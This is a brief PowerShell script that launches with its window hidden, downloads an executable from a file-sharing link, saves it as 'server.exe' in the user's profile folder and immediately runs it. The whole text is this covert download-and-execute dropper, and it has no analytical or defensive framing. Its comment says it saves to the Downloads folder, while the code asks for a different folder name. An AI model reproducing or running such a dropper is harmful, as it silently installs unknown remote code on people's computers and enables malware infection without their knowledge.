PowerShell.exe -WindowStyle hidden {
# URL of the file to download
$url = "https://filetransfer.io/data-package/A4QWrqps/download"

# Get the user's "Downloads" folder
$downloadsFolder = [Environment]::GetFolderPath("User")

# Local path to save the downloaded file
$outputPath = Join-Path -Path $downloadsFolder -ChildPath "server.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Wait for the download to complete
while ((Test-Path -Path $outputPath) -eq $false) {
    Start-Sleep -Seconds 1
}

# Run the downloaded file
Start-Process -FilePath $outputPath
}